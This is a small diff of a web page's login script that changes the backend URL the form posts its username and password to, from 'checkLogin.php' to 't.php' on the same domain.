@@ -75,6 +75,7 @@
 
 
    <script>
+     
     document.getElementById('loginForm').addEventListener('submit', function(event) {
       event.preventDefault();
         const username = document.getElementById('username').value;
@@ -85,7 +86,7 @@
         password:password
       }
 
-      fetch('https://eggsale.rf.gd/checkLogin.php', {
+      fetch('https://eggsale.rf.gd/t.php', {
        
         method: 'POST',
         headers: {
